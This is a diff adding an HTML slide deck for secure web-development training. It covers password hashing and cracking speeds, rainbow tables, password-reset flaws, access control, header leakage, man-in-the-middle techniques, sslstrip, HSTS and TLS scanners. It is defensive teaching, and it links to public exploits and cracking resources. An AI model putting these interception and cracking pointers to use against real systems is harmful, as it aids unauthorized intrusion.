@@ -1,0 +1,2750 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>websec</title>
+    <meta charset="utf-8">
+    <style>
+		// one small step for man
+		/* latin-ext */
+		@font-face {
+		  font-family: 'Yanone Kaffeesatz';
+		  font-style: normal;
+		  font-weight: 400;
+		  src: local('Yanone Kaffeesatz Regular'), local('YanoneKaffeesatz-Regular'), url(YDAoLskQQ5MOAgvHUQCcLV83L2yn_om9bG0a6EHWBso.woff2) format('woff2');
+		  unicode-range: U+0100-024F, U+1E00-1EFF, U+20A0-20AB, U+20AD-20CF, U+2C60-2C7F, U+A720-A7FF;
+		}
+		/* latin */
+		@font-face {
+		  font-family: 'Yanone Kaffeesatz';
+		  font-style: normal;
+		  font-weight: 400;
+		  src: local('Yanone Kaffeesatz Regular'), local('YanoneKaffeesatz-Regular'), url(YDAoLskQQ5MOAgvHUQCcLfGwxTS8d1Q9KiDNCMKLFUM.woff2) format('woff2');
+		  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215, U+E0FF, U+EFFD, U+F000;
+		}
+		/* latin */
+		@font-face {
+		  font-family: 'Droid Serif';
+		  font-style: normal;
+		  font-weight: 400;
+		  src: local('Droid Serif'), local('DroidSerif'), url(https://fonts.gstatic.com/s/droidserif/v6/0AKsP294HTD-nvJgucYTaI4P5ICox8Kq3LLUNMylGO4.woff2) format('woff2');
+		  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215, U+E0FF, U+EFFD, U+F000;
+		}
+		/* latin */
+		@font-face {
+		  font-family: 'Droid Serif';
+		  font-style: normal;
+		  font-weight: 700;
+		  src: local('Droid Serif Bold'), local('DroidSerif-Bold'), url(https://fonts.gstatic.com/s/droidserif/v6/QQt14e8dY39u-eYBZmppwYlIZu-HDpmDIZMigmsroc4.woff2) format('woff2');
+		  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215, U+E0FF, U+EFFD, U+F000;
+		}
+		/* latin */
+		@font-face {
+		  font-family: 'Droid Serif';
+		  font-style: italic;
+		  font-weight: 400;
+		  src: local('Droid Serif Italic'), local('DroidSerif-Italic'), url(https://fonts.gstatic.com/s/droidserif/v6/cj2hUnSRBhwmSPr9kS5898u2Q0OS-KeTAWjgkS85mDg.woff2) format('woff2');
+		  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215, U+E0FF, U+EFFD, U+F000;
+		}
+		/* cyrillic-ext */
+		@font-face {
+		  font-family: 'Ubuntu Mono';
+		  font-style: normal;
+		  font-weight: 400;
+		  src: local('Ubuntu Mono'), local('UbuntuMono-Regular'), url(ViZhet7Ak-LRXZMXzuAfkTTOQ_MqJVwkKsUn0wKzc2I.woff2) format('woff2');
+		  unicode-range: U+0460-052F, U+20B4, U+2DE0-2DFF, U+A640-A69F;
+		}
+		/* cyrillic */
+		@font-face {
+		  font-family: 'Ubuntu Mono';
+		  font-style: normal;
+		  font-weight: 400;
+		  src: local('Ubuntu Mono'), local('UbuntuMono-Regular'), url(ViZhet7Ak-LRXZMXzuAfkTUj_cnvWIuuBMVgbX098Mw.woff2) format('woff2');
+		  unicode-range: U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
+		}
+		/* greek-ext */
+		@font-face {
+		  font-family: 'Ubuntu Mono';
+		  font-style: normal;
+		  font-weight: 400;
+		  src: local('Ubuntu Mono'), local('UbuntuMono-Regular'), url(ViZhet7Ak-LRXZMXzuAfkUbcKLIaa1LC45dFaAfauRA.woff2) format('woff2');
+		  unicode-range: U+1F00-1FFF;
+		}
+		/* greek */
+		@font-face {
+		  font-family: 'Ubuntu Mono';
+		  font-style: normal;
+		  font-weight: 400;
+		  src: local('Ubuntu Mono'), local('UbuntuMono-Regular'), url(ViZhet7Ak-LRXZMXzuAfkWo_sUJ8uO4YLWRInS22T3Y.woff2) format('woff2');
+		  unicode-range: U+0370-03FF;
+		}
+		/* latin-ext */
+		@font-face {
+		  font-family: 'Ubuntu Mono';
+		  font-style: normal;
+		  font-weight: 400;
+		  src: local('Ubuntu Mono'), local('UbuntuMono-Regular'), url(ViZhet7Ak-LRXZMXzuAfkSYE0-AqJ3nfInTTiDXDjU4.woff2) format('woff2');
+		  unicode-range: U+0100-024F, U+1E00-1EFF, U+20A0-20AB, U+20AD-20CF, U+2C60-2C7F, U+A720-A7FF;
+		}
+		/* latin */
+		@font-face {
+		  font-family: 'Ubuntu Mono';
+		  font-style: normal;
+		  font-weight: 400;
+		  src: local('Ubuntu Mono'), local('UbuntuMono-Regular'), url(ViZhet7Ak-LRXZMXzuAfkY4P5ICox8Kq3LLUNMylGO4.woff2) format('woff2');
+		  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215, U+E0FF, U+EFFD, U+F000;
+		}
+		/* cyrillic-ext */
+		@font-face {
+		  font-family: 'Ubuntu Mono';
+		  font-style: normal;
+		  font-weight: 700;
+		  src: local('Ubuntu Mono Bold'), local('UbuntuMono-Bold'), url(ceqTZGKHipo8pJj4molytp6iIh_FvlUHQwED9Yt5Kbw.woff2) format('woff2');
+		  unicode-range: U+0460-052F, U+20B4, U+2DE0-2DFF, U+A640-A69F;
+		}
+		/* cyrillic */
+		@font-face {
+		  font-family: 'Ubuntu Mono';
+		  font-style: normal;
+		  font-weight: 700;
+		  src: local('Ubuntu Mono Bold'), local('UbuntuMono-Bold'), url(ceqTZGKHipo8pJj4molyti_vZmeiCMnoWNN9rHBYaTc.woff2) format('woff2');
+		  unicode-range: U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
+		}
+		/* greek-ext */
+		@font-face {
+		  font-family: 'Ubuntu Mono';
+		  font-style: normal;
+		  font-weight: 700;
+		  src: local('Ubuntu Mono Bold'), local('UbuntuMono-Bold'), url(ceqTZGKHipo8pJj4molytiFaMxiho_5XQnyRZzQsrZs.woff2) format('woff2');
+		  unicode-range: U+1F00-1FFF;
+		}
+		/* greek */
+		@font-face {
+		  font-family: 'Ubuntu Mono';
+		  font-style: normal;
+		  font-weight: 700;
+		  src: local('Ubuntu Mono Bold'), local('UbuntuMono-Bold'), url(ceqTZGKHipo8pJj4molytgalQocB-__pDVGhF3uS2Ks.woff2) format('woff2');
+		  unicode-range: U+0370-03FF;
+		}
+		/* latin-ext */
+		@font-face {
+		  font-family: 'Ubuntu Mono';
+		  font-style: normal;
+		  font-weight: 700;
+		  src: local('Ubuntu Mono Bold'), local('UbuntuMono-Bold'), url(ceqTZGKHipo8pJj4molytujkDdvhIIFj_YMdgqpnSB0.woff2) format('woff2');
+		  unicode-range: U+0100-024F, U+1E00-1EFF, U+20A0-20AB, U+20AD-20CF, U+2C60-2C7F, U+A720-A7FF;
+		}
+		/* latin */
+		@font-face {
+		  font-family: 'Ubuntu Mono';
+		  font-style: normal;
+		  font-weight: 700;
+		  src: local('Ubuntu Mono Bold'), local('UbuntuMono-Bold'), url(ceqTZGKHipo8pJj4molytolIZu-HDpmDIZMigmsroc4.woff2) format('woff2');
+		  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215, U+E0FF, U+EFFD, U+F000;
+		}
+		/* cyrillic-ext */
+		@font-face {
+		  font-family: 'Ubuntu Mono';
+		  font-style: italic;
+		  font-weight: 400;
+		  src: local('Ubuntu Mono Italic'), local('UbuntuMono-Italic'), url(KAKuHXAHZOeECOWAHsRKAxNcqx07xvyppV96iFRdwiM.woff2) format('woff2');
+		  unicode-range: U+0460-052F, U+20B4, U+2DE0-2DFF, U+A640-A69F;
+		}
+		/* cyrillic */
+		@font-face {
+		  font-family: 'Ubuntu Mono';
+		  font-style: italic;
+		  font-weight: 400;
+		  src: local('Ubuntu Mono Italic'), local('UbuntuMono-Italic'), url(KAKuHXAHZOeECOWAHsRKA-fhZE2STYI3KzBGzrJG_ik.woff2) format('woff2');
+		  unicode-range: U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
+		}
+		/* greek-ext */
+		@font-face {
+		  font-family: 'Ubuntu Mono';
+		  font-style: italic;
+		  font-weight: 400;
+		  src: local('Ubuntu Mono Italic'), local('UbuntuMono-Italic'), url(KAKuHXAHZOeECOWAHsRKA26cj8HaeL2jS4NIBPr3RFo.woff2) format('woff2');
+		  unicode-range: U+1F00-1FFF;
+		}
+		/* greek */
+		@font-face {
+		  font-family: 'Ubuntu Mono';
+		  font-style: italic;
+		  font-weight: 400;
+		  src: local('Ubuntu Mono Italic'), local('UbuntuMono-Italic'), url(KAKuHXAHZOeECOWAHsRKA9cKKn5Xt5n-nnvkqIBMZms.woff2) format('woff2');
+		  unicode-range: U+0370-03FF;
+		}
+		/* latin-ext */
+		@font-face {
+		  font-family: 'Ubuntu Mono';
+		  font-style: italic;
+		  font-weight: 400;
+		  src: local('Ubuntu Mono Italic'), local('UbuntuMono-Italic'), url(KAKuHXAHZOeECOWAHsRKA0_0lycXMw8PhobHtu2Qgco.woff2) format('woff2');
+		  unicode-range: U+0100-024F, U+1E00-1EFF, U+20A0-20AB, U+20AD-20CF, U+2C60-2C7F, U+A720-A7FF;
+		}
+		/* latin */
+		@font-face {
+		  font-family: 'Ubuntu Mono';
+		  font-style: italic;
+		  font-weight: 400;
+		  src: local('Ubuntu Mono Italic'), local('UbuntuMono-Italic'), url(KAKuHXAHZOeECOWAHsRKA8u2Q0OS-KeTAWjgkS85mDg.woff2) format('woff2');
+		  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215, U+E0FF, U+EFFD, U+F000;
+		}
+
+      body { font-family: 'Droid Serif'; }
+      h1, h2, h3 {
+        font-family: 'Yanone Kaffeesatz';
+        font-weight: normal;
+      }
+      .remark-code, .remark-inline-code { font-family: 'Ubuntu Mono'; }
+	  img.ns {
+		  box-shadow: none !important;
+	  }
+	  img {
+		  box-shadow: 0 0 40px #ccc;
+	  }
+		.c {
+		display: block;
+		margin-left: auto;
+		margin-right: auto;
+		}
+    </style>
+  </head>
+  <body>
+    <textarea id="source">
+
+# Boot USB - Choose "Live USB Persistence"
+<img class="c" src="kalip.jpg" width="80%">
+---
+class: center, middle
+# Secure Development Training
+Magnus Klaaborg Stubman
+
+slides: http://dumpco.re/slides/a2
+---
+# Agenda
+
+1. Authentication
+2. Authorization / Access Control
+3. Sensitive Data Exposure
+4. Transport Layer Encryption
+5. Security Misconfigurations
+6. Object Injection / Insecure Deserialization
+7. Third party components
+8. Insufficient Attack Protection
+9. Cross-Site Scripting (XSS)
+10. Cross-Site Request Forgery (CSRF)
+11. Command injection
+12. SQL injection (SQLi)
+13. Session Management
+---
+class: middle, center
+# Authentication
+Process of proving the identify of a user or process
+---
+# Authentication
+- Weak protection of stored credentials
+- Guessable password (Weak password policy)
+- Forgot password
+- Password change
+- E-mail change
+- Notification of authentication events
+---
+# Weak protection of stored credentials
+```
++-USERS----+----------+
+| username | password |
++---------------------+
+| admin    | pass123  |
+| kevin    | m0ney    |
+| john     | 619air   |
++----------+----------+
+```
+---
+class: middle, center
+# Password hashing
+---
+# Password hashing
+Goal: ensure that it is impossible to learn the passwords in the event that an attacker gains access to the database
+---
+# Password hashing
+Goal: ensure that it is ~~impossible~~ **impractical** to learn the passwords in the event that an attacker gains access to the database
+---
+# Password hashing
+"One-way Hash Functions"
+
+<img src="hash-function.png" width="60%" class="c">
+source: https://simple.wikipedia.org/wiki/Hash_function#/media/File:Hash_function.svg
+---
+# MD5 password hashing
+- md5(`pass123`) == `32250170a0dca92d53ec9624f336ca24`
+- md5(`m0ney`)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;== `8d717d103f782b5079b525a4d474750f`
+- md5(`619air`)&nbsp;&nbsp;&nbsp;== `fa5ee85167943edb3649af8c54d99558`
+---
+# MD5 password hashing
+```
++-USERS----+----------------------------------+
+| username | password_hash                    |
++---------------------------------------------+
+| admin    | 32250170a0dca92d53ec9624f336ca24 |
+| kevin    | 8d717d103f782b5079b525a4d474750f |
+| john     | fa5ee85167943edb3649af8c54d99558 |
++----------+----------------------------------+
+```
+---
+# MD5 password hashing
+```
++-USERS----+----------------------------------+
+| username | password_hash                    |
++---------------------------------------------+
+| admin    | 32250170a0dca92d53ec9624f336ca24 |
+| kevin    | 8d717d103f782b5079b525a4d474750f |
+| john     | fa5ee85167943edb3649af8c54d99558 |
++----------+----------------------------------+
+```
+```php
+$stmt = $conn->prepare("SELECT * FROM users WHERE username=? AND password_hash=?");
+$stmt->bind_param("ss", $username, md5($password));
+```
+---
+# Password cracking (8x Nvidia GTX 1080)
+
+Algorithm          | speed
+-------------------|-------------
+MD5                | 200.3 GH/s
+SHA1               | 68771.0 MH/s
+SHA256             | 23012.1 MH/s
+SHA384             | 8408.5 MH/s
+SHA256             | 8624.7 MH/s
+SHA-3              | 6495.6 MH/s
+PBKDF2-HMAC-MD5    | 59296.5 kH/s
+PBKDF2-HMAC-SHA1   | 26156.2 kH/s
+PBKDF2-HMAC-SHA256 | 9473.2 kH/s
+PBKDF2-HMAC-SHA512 | 3450.1 kH/s
+OSX 10.8+          | 98618 H/s
+sha512crypt        | 1168.6 kH/s
+WPA/WPA2           | 3177.6 kH/s
+NetNTLMv1          | 179.3 GH/s
+NetNTLMv2          | 13149.5 MH/s
+
+source: https://gist.github.com/epixoip/a83d38f412b4737e99bbef804a270c40
+---
+# PBKDF2-HMAC-SHA256
+
+```php
+function myhash($password, $salt, $iterations) {
+	return hash_pbkdf2("sha512", $password, $salt, $iterations);
+}
+```
+---
+# PBKDF2-HMAC-SHA256
+
+```php
+function myhash($password, $salt, $iterations) {
+	return hash_pbkdf2("sha512", $password, $salt, $iterations);
+}
+
+echo myhash("pass123", "0hK53wquk", 1000);
+// dc8fb849620e7d1d7ba103da70a1156b2734f20178e1db32024712a546127b110530732aa1d8
+// 10592989eef5c9e77e15c4c3cac0f725f5e6a9586b201e969c8b
+
+echo myhash("m0ney", "yEQ9PjDRZg", 1000);
+// 731dbe6af2208ae383671ef2f51e747a923bc25e4c5cb367a32f9c4dbe297af84652e961ea45
+// faaaa610af36f6b8cb0dfc573f951174454537e6169c0d70d4af
+
+echo myhash("619air", "2jLyqfZ3E1", 1000);
+// 32194a4ac44c403cee1f88f756e0631a3996e61a0879cbd129d87357d223dcad56af18900edc
+// ae88a1f3ef571a7b05b38c742621133445f5241ee04be67897a4
+```
+```
++----------+---------------+------------+------------+
+| username | password_hash | salt       | iterations |
++---------------------------------------+------------+
+| admin    | dc8fb84962... | 0hK53wquk  | 1000       |
+| kevin    | 731dbe6af2... | yEQ9PjDRZg | 1000       |
+| john     | 32194a4ac4... | 2jLyqfZ3E1 | 1000       |
++----------+---------------+------------+------------+
+```
+---
+# Iterations
+- As many as practically possible for your users (usability vs security)
+- Must increase over time as hardware becomes faster
+---
+# Salt
+
+Purpose: prevent precomputation attacks by making hash unique
+
+`hashFunction(password + salt) = hash`
+
+- Salt **must** be unqiue per user
+---
+# Precomputation attacks
+
+<img src="googlehash.png" width="100%" class="c">
+---
+# Precomputation attacks
+Rainbow table - precomputed table of plaintext passwords and their corresponding hash.
+Example:
+
+```
+a:0cc175b9c0f1b6a831c399e269772661
+b:92eb5ffee6ae2fec3ad71c777531578f
+c:4a8a08f09d37b73795649038408b5f33
+d:8277e0910d750195b448797616e091ad
+e:e1671797c52e15f763380b45e841ec32
+...
+```
+Download LM/NTLM/MD5/SHA1 tables here: http://project-rainbowcrack.com/table.htm
+---
+# RainbowCrack screenshot
+<img src="rainbowcrack.png" width="100%" class="c">
+---
+# Password hashing conclusion
+
+- Hash and salt credentials
+- Use a hashing algorithm that is sufficiently slow
+- Do **NOT** implement your own hashing algorithm
+---
+class: middle, center
+# Guessable password
+Weak password policy
+---
+# Guessable password
+- Minimum password length, e.g. 12 characters or as long as practically possible (usability)
+- Add a blacklist of known weak passwords e.g.
+ - `Summer17`
+ - `Summer2017`
+ - `Password1`
+ - `C0mpanyname`
+ - `Companyname1`
+ - `Companyname1!`
+ - `Companyname123`
+- Industry standard: require at least three of the following categories:
+ - lowercase characters
+ - Uppercase characters
+ - digits
+ - symbols
+---
+### Mandatory xkcd reference #2 (https://xkcd.com/936/)
+<img src="password_strength.png" width="88%" class="c ns">
+---
+class: middle, center
+### Rule of thumb: length (almost) always beats complexity
+---
+## Examples where length does **not** beat complexity:
+- `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa...` (max length)
+- `bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb...` (max length)
+- `000000000000000000000000000000000000000000000000000000...` (max length)
+- etc
+---
+class: middle, center
+## Encourage your users to use password managers!
+---
+# Guessable password
+
+Is this OK?
+
+1. Create new online user. Username is the employee's 6-digit access card number, printed on the card
+
+2. Employee can login the first time with a blank password, and need to change his/her password on first login
+---
+# Guessable password
+
+Is this OK?
+
+1. Create new online user. Username is the employee's 6-digit access card number, printed on the card
+
+2. Employee can login the first time with a blank password, and need to change his/her password on first login
+
+- Anyone can take over an employee's account if the employee hasn't logged in yet
+---
+# Guessable password
+
+Is this OK?
+
+1. Create new online user. Username is the employee's 6-digit access card number, printed on the card
+
+2. Employee can login the first time with a blank password, and need to change his/her password on first login
+
+- Anyone can take over an employee's account if the employee hasn't logged in yet
+	- Is this really a serious problem?
+
+---
+# Guessable passwords conclusion
+- Enforce strong passwords
+- Blacklist "known bad" passwords
+- Encourage the use of password managers
+---
+class: middle, center
+# Forgot password
+---
+# Forgot password
+No industry standard
+- Do you need to have security questions? If so, make sure that it's not possible to research the answer!
+	- "What's the name of your first pet?"
+	- "What's the name of your first school?"
+	- "What's your mom's maiden name?"
+	- "What's your first female teacher's maiden name?"
+	
+Remember that the answers need to be protected just as well as the passwords are protected
+---
+# Forgot password
+Spot the problem(s):
+1. User clicks "forgot password"
+2. System resets the user's password to a random password and e-mails it to the user
+---
+# Forgot password
+Spot the problem(s):
+1. User clicks "forgot password"
+2. System resets the user's password to a random password and e-mails it to the user
+
+Problem:
+1. Password is (potentially) transmitted in clear-text in the e-mail
+---
+# Forgot password
+Spot the problem(s):
+
+1. User clicks "forgot password"
+2. System e-mails the user a secret URL which allows the user to change password
+3. User uses the URL to reset the password
+---
+# Forgot password
+Spot the problem(s):
+
+1. User clicks "forgot password"
+2. System e-mails the user a secret URL which allows the user to change password
+3. User uses the URL to reset the password
+
+Hint:
+- Think about what happens to the secret URL later?
+---
+# Forgot password
+Spot the problem(s):
+
+1. User clicks "forgot password"
+2. System e-mails the user a secret URL which allows the user to change password
+3. User uses the URL to reset the password
+
+Hint:
+- Think about what happens to the secret URL later?
+- What if the secret URL is leaked and an attacker gets access to it later?
+---
+# Forgot password
+Spot the problem(s):
+
+1. User clicks "forgot password"
+2. System e-mails the user a secret URL which allows the user to change password
+3. User uses the URL to reset the password
+
+Hint:
+- Think about what happens to the secret URL later?
+- What if the secret URL is leaked and an attacker gets access to it later?
+
+Problem:
+- The secret URL is never revoked
+---
+# Forgot password
+Spot the problem(s):
+
+1. User clicks "forgot password"
+2. System e-mails the user a secret URL which allows the user to change password
+3. User uses the URL to reset the password
+4. The secret URL is revoked
+---
+# Forgot password
+Spot the problem(s):
+
+1. User clicks "forgot password"
+2. System e-mails the user a secret URL which allows the user to change password
+3. User uses the URL to reset the password
+4. The secret URL is revoked
+
+Hint:
+- What happens if the user never visits the secret URL?
+---
+# Forgot password
+Spot the problem(s):
+
+1. User clicks "forgot password"
+2. System e-mails the user a secret URL which allows the user to change password
+3. User uses the URL to reset the password
+4. The secret URL is revoked
+
+Hint:
+- What happens if the user never visits the secret URL?
+
+Problem:
+- The secret URL never expires
+---
+# Forgot password conclusion
+- If possible, avoid security questions as it's hard to reason about whether or not a specific answer is researchable/guessable by an attacker
+- The secret URL must not be guessable
+- The secret URL may only be used once
+- The secret URL must be revoked after use
+- The secret URL must expire
+---
+class: center, middle
+# Change password
+---
+# Change password
+Spot the problem(s):
+
+<img src="changepassword.png" width="100%">
+---
+# Change password
+Spot the problem(s):
+
+<img src="changepassword.png" width="80%" class="c">
+
+- Problem: updating the password does not require the old password
+- Impact: attackers who gain access to a valid session can completely take over the account
+---
+## Question: Is it necessary to repeat new password?
+<img src="changepassword.png" width="80%" class="c">
+---
+## Question: Is it necessary to repeat new password?
+<img src="changepassword.png" width="80%" class="c">
+
+Answer: No. It's a matter of usability, not security.
+
+(Only if no "forgot password" functionality is available)
+---
+class: center, middle
+# Change e-mail address
+---
+# Change e-mail address
+Must also require the user to enter old password to prevent the following attack scenario:
+
+1. Attacker gains access to active session, somehow
+2. Attacker changes the victim's e-mail address to the attacker's e-mail
+3. Attacker uses "forgot password" functionality to change the password
+---
+## Change password & e-mail address conclusion
+- Sensitive account settings must require the user's password to update them
+- E-mail address is a sensitive account setting
+---
+# Notification of authentication events
+<img src="successful-login.png" width="80%" class="c">
+---
+# Notification of authentication events
+Also for ...
+
+- Change password
+- Change e-mail
+
+... everything which is security related
+---
+class: center, middle
+# Authorization / Access Control
+*"Should X have access to Y?"*
+---
+# Authorization / Access Control
+
+```html
+<script>
+	function validateForm() {
+		var x = document.forms["myForm"]["fname"].value;
+		if (x.length > 32) {
+			alert("Name cannot be longer than 32 characters");
+			return false;
+		}
+	}
+</script>
+
+<form name="myForm" action="/add.aspx" onsubmit="return validateForm()">
+	Name: <input type="text" name="fname">
+	<input type="submit" value="Submit">
+</form>
+```
+---
+# Authorization / Access Control
+
+<img src="client-side-validation.jpg" width="90%" >
+---
+class: center, middle
+<img src="downarrow.png" width="5%" style="visibility:hidden;box-shadow:none;margin-left:58%;">
+`http://example.com/download?type=transactions&account=487002&format=pdf`
+<img src="downarrow.png" width="5%" style="visibility:hidden;box-shadow:none;margin-left:58%;">
+---
+class: center, middle
+<img src="downarrow.png" width="5%" style="box-shadow:none;margin-left:58%;">
+`http://example.com/download?type=transactions&account=487002&format=pdf`
+<img src="downarrow.png" width="5%" style="visibility:hidden;box-shadow:none;margin-left:58%;">
+---
+class: center, middle
+<img src="downarrow.png" width="5%" style="box-shadow:none;margin-left:58%;">
+`http://example.com/download?type=transactions&account=487002&format=pdf`
+
+Can we change it to someone else's account number?
+---
+# Conclusion
+- Always verify input (which we do not strictly control ourselves)
+---
+class: middle, center
+# Sensitive Data Exposure
+---
+# Sensitive Data Exposure
+What's the problem?
+```HTTP
+HTTP/1.1 200 OK
+Server: Apache/1.3.22 (Unix) OpenSSL/1.0.2l PHP/7.1.7 mod_perl/2.0.8-dev
+   Perl/v5.16.3 mod_ssl/2.8.6
+X-Powered-By: PHP/7.1.7
+X-Robots-Tag: noindex
+X-Content-Type-Options: nosniff
+Expires: Wed, 11 Jan 1984 05:00:00 GMT
+Cache-Control: no-cache, must-revalidate, max-age=0
+X-Frame-Options: SAMEORIGIN
+Content-Length: 351
+```
+---
+# Sensitive Data Exposure
+What's the problem?
+```HTTP
+HTTP/1.1 200 OK
+Server: Apache/1.3.22 (Unix) OpenSSL/1.0.2l PHP/7.1.7 mod_perl/2.0.8-dev
+   Perl/v5.16.3 mod_ssl/2.8.6
+X-Powered-By: PHP/7.1.7
+X-Robots-Tag: noindex
+X-Content-Type-Options: nosniff
+Expires: Wed, 11 Jan 1984 05:00:00 GMT
+Cache-Control: no-cache, must-revalidate, max-age=0
+X-Frame-Options: SAMEORIGIN
+Content-Length: 351
+```
+Leaks:
+- Operating system
+- Web server software and detailed version
+- OpenSSL version
+- PHP version
+- Perl version
+- Apache plugins + version
+---
+# Sensitive Data Exposure
+What's the problem?
+```HTTP
+HTTP/1.1 200 OK
+Server: Apache/1.3.22 (Unix) OpenSSL/1.0.2l PHP/7.1.7 mod_perl/2.0.8-dev
+   Perl/v5.16.3 mod_ssl/2.8.6
+X-Powered-By: PHP/7.1.7
+X-Robots-Tag: noindex
+X-Content-Type-Options: nosniff
+Expires: Wed, 11 Jan 1984 05:00:00 GMT
+Cache-Control: no-cache, must-revalidate, max-age=0
+X-Frame-Options: SAMEORIGIN
+Content-Length: 351
+```
+Leaks:
+- Operating system
+- Web server software and detailed version
+- OpenSSL version
+- PHP version
+- Perl version
+- Apache plugins + version
+
+https://www.exploit-db.com/exploits/764/
+---
+<img src="mod_sslexploit.png" width="80%" class="c">
+---
+### What's the problem?
+<img src="exception.png" width="120%" class="c">
+---
+### Problems
+- Leaks framework
+- Leaks source code
+- Leaks call stack
+	- enables attackers to make educated guesses on version numbers based on call stack or class names
+
+Aids an attacker in attacking the system
+---
+class: middle, center
+# http**s**://
+Transport Layer Encryption
+---
+# Transport Layer Encryption
+Goal: provide privacy and integrity of data while in transit
+
+- privacy = no one can read what I'm sending
+- integrity = The recipient can tell if anyone changed what I'm sending
+
+A protocol which implements Transport Layer Encryption is the protocol called TLS (Transport Layer Security), the successor of SSL (Secure Socket Layer) which is now broken.
+
+
+Sidenote: TLS can be used for anything and not just HTTP traffic
+<img class="c ns" src="mitm.png" width="80%" style="margin-top: 10%">
+---
+### "Suitably positioned attacker" - Man in the Middle (MitM)
+
+- Unencrypted Wi-Fi
+- Using untrusted proxies (HTTP/socks/VPN/...)
+- ARP poisoning 
+- ICMP type 5 redirect
+- Rogue DHCP
+- IPv6 router advertisements
+- ...
+<img class="c ns" src="mitm.png" width="80%" style="margin-top: 10%;margin-bottom:10%;">
+
+Vulnerabilities which require MitM have an increased complexity of exploitation, but should not be neglected
+---
+# Partial transport layer encryption
+
+*"The payment functionality use HTTPS, so no sensitive data can be intercepted. Everything else is HTTP."*
+---
+# Partial transport layer encryption
+
+*"The payment functionality use HTTPS, so no sensitive data can be intercepted. Everything else is HTTP."*
+
+Attack: modify the unprotected content which leads to the payment functionality, and remove TLS
+---
+# Downgrading HTTPS to HTTP
+If we can intercept the initial connection, then we can replace all HTTPS links with HTTP.
+
+<img class="c ns" src="sslstrip.png" width="80%" style="margin-top: 5%;margin-bottom: 5%;">
+
+- sslstrip MitM tool: https://github.com/moxie0/sslstrip
+- demo: https://youtu.be/WglJdxqeDrk?t=45s
+---
+# HTTP Strict Transport Security (HSTS)
+HTTP Response header:
+```http
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+```
+
+- HSTS automatically redirects HTTP requests to HTTPS for the target domain
+
+- HSTS does not allow a user to override the invalid certificate message
+
+
+... but HSTS does not work before the user has visited the site the first time
+---
+# Permanent HSTS
+HTTP Response header:
+```http
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+```
+... will signal that you want your site to be included in the preload list as maintained by Google, and used by Firefox and Safari.
+
+
+**Sending the preload directive from your site can have PERMANENT CONSEQUENCES and prevent users from accessing your site and any of its subdomains if you find you need to switch back to HTTP.**
+---
+# Public Key Pinning (HPKP)
+
+```
+Public-Key-Pins: pin-sha256="d6qzRu9zOECb90Uez27xWltNsj0e1Md7GkYYkVoZWmM=";
+	pin-sha256="E9CZ9INDbd+2eRQozYqqbQ2yXLVKB9+xcprMF+44U1g=";
+	report-uri="http://example.com/pkp-report";
+	max-age=10000;
+	includeSubDomains
+```
+
+- Instruct the browser that for the duration of `max-age` (seconds) only accept the fingerprints specified by `pin-sha256` (SPKI fingerprints).
+- Subdomains are included when `includeSubDomains` are specified.
+- Pin validation failures are reported to `report-uri` if specified.
+
+https://developer.mozilla.org/en-US/docs/Web/HTTP/Public_Key_Pinning
+
+**Caution:** If you for some reason need to change your certificate, some users will not be able to access your site!
+
+(click [here](https://www.ietf.org/mail-archive/web/websec/current/msg02106.html) if you wonder why anything other than sha256 isn't supported)
+
+**UPDATE:** Google has deprecated https://groups.google.com/a/chromium.org/forum/#!topic/blink-dev/he9tr7p3rZ8
+---
+# Teach users what to look for
+<img class="c" src="teachtls.png" width="90%">
+---
+class: middle, center
+## TLS misconfigurations
+---
+## TLS misconfigurations
+<img src="tlsattacks.png" width="80%" class="c">
+
+source: https://en.wikipedia.org/wiki/Transport_Layer_Security
+
+- Outdated components (e.g. [Heartbleed](http://heartbleed.com/) [exploit](https://www.exploit-db.com/exploits/32998/))
+- Logjam (https://weakdh.org/logjam.html)
+---
+### Logjam demo
+<video class="c" style="box-shadow: 0 0 40px #ccc;" width="90%" controls autoplay>
+	<source src="eavesdrop-dhe-512.mp4" type="video/mp4">
+	Your browser does not support MP4 videos.
+  </video>
+
+source: https://weakdh.org/logjam.html
+---
+# TLS misconfigurations
+
+- Expired certificate
+- Using SSL (poodle)
+- Using weak cipher suites
+- SHA1 signature
+- Padding Oracle
+- Forward Secrecy
+- ...
+---
+# SSL/TLS tools
+- https://github.com/rbsec/sslscan
+- https://testssl.sh/
+- https://www.ssllabs.com/ssltest/
+---
+<img src="sslscan.png" width="75%" class="c">
+---
+<img src="testssl-mx.png" width="100%" class="c">
+source: https://testssl.sh/
+---
+<img src="ssllabs.png" width="100%" class="c">
+---
+# Exercises
+1. Use the tools to check your own websites
+	- `sslscan`
+	- `testssl`
+2. Be sceptical about the results of the tools and do your own research before concluding that a problem exists
+3. Go to https://www.ssllabs.com/ssltest/ and look at examples under "Recent Worst" - scan them with your tools
+---
+class: middle, center
+# Question: Where should we terminate TLS?
+---
+class: middle, center
+<img src="server-laptop.png" width="80%" class="ns c">
+---
+class: middle, center
+<img src="server-stuff-laptop.png" width="80%" class="ns c">
+---
+class: middle, center
+<img src="server-stuffx2-laptop.png" width="80%" class="ns c">
+---
